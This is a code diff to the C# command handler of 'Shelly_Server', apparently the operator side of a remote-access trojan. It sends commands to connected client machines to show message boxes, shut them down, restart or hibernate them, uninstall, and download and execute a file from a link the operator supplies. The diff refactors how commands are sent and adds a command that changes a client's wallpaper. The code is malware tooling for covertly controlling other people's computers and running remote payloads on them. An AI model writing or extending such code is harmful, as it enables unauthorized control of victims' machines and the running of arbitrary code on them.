@@ -6,8 +6,11 @@ namespace Shelly_Server
     {
         public static void IO(string UserIO)
         {
+            string Command = UserIO.ToLower();
+            string CommandPS = Command + " ";
+
             // Turn to lower case and handle it
-            switch (UserIO.ToLower())
+            switch (Command)
             {
                 // Shows help section
                 case "help":
@@ -25,8 +28,8 @@ namespace Shelly_Server
                         "4. MessageBox - Shows a messagebox on the clients computer\n" +
                         "5. DownloadAndExecute - Downloads and executes a file\n\n" +
 
-                        //"FUN\n" +
-                        //"1. Change wallpaper\n\n" +
+                        "FUN\n" +
+                        "1. ChangeWallpaper - Changes client desktop wallpaper\n\n" +
 
                         "POWER OPTIONS\n" +
 
@@ -52,7 +55,7 @@ namespace Shelly_Server
                 case "uninstall":
 
                     // Send message
-                    SocketHandler.Send("uninstall");
+                    SocketHandler.Send(Command);
 
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
@@ -62,7 +65,7 @@ namespace Shelly_Server
                 case "disconnect":
 
                     // Send message
-                    SocketHandler.Send("disconnect");
+                    SocketHandler.Send(Command);
 
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
@@ -73,7 +76,7 @@ namespace Shelly_Server
                 case "ping":
 
                     // Send message
-                    SocketHandler.Send("ping");
+                    SocketHandler.Send(Command);
 
                     // Receive response
                     Console.WriteLine(SocketHandler.Receive());
@@ -82,26 +85,19 @@ namespace Shelly_Server
                 // Show messagebox
                 case "messagebox":
 
-                    // Get user input
-                    string Msg = Functions.UserInput.GetMessageBoxInput();
-
                     // Send message
-                    SocketHandler.Send("messagebox");
-
-                    // Send message
-                    SocketHandler.Send(Msg);
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetMessageBoxInput());
                     break;
 
                 case "downloadandexecute":
 
-                    // Get user input
-                    string DNE = Functions.UserInput.GetDNEInput();
-
                     // Send message
-                    SocketHandler.Send("downloadandexecute");
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1));
+                    break;
 
-                    // Send message
-                    SocketHandler.Send(DNE);
+                case "changewallpaper":
+
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(2));
 
                     break;
 
@@ -109,7 +105,7 @@ namespace Shelly_Server
                 case "shutdown":
 
                     // Send message
-                    SocketHandler.Send("shutdown");
+                    SocketHandler.Send(Command);
 
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
@@ -119,7 +115,7 @@ namespace Shelly_Server
                 case "restart":
 
                     // Send message
-                    SocketHandler.Send("restart");
+                    SocketHandler.Send(Command);
 
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
@@ -129,7 +125,7 @@ namespace Shelly_Server
                 case "hibernate":
 
                     // Send message
-                    SocketHandler.Send("hibernate");
+                    SocketHandler.Send(Command);
 
                     // Disconnect and exit
                     SocketHandler.ShutdownServer();
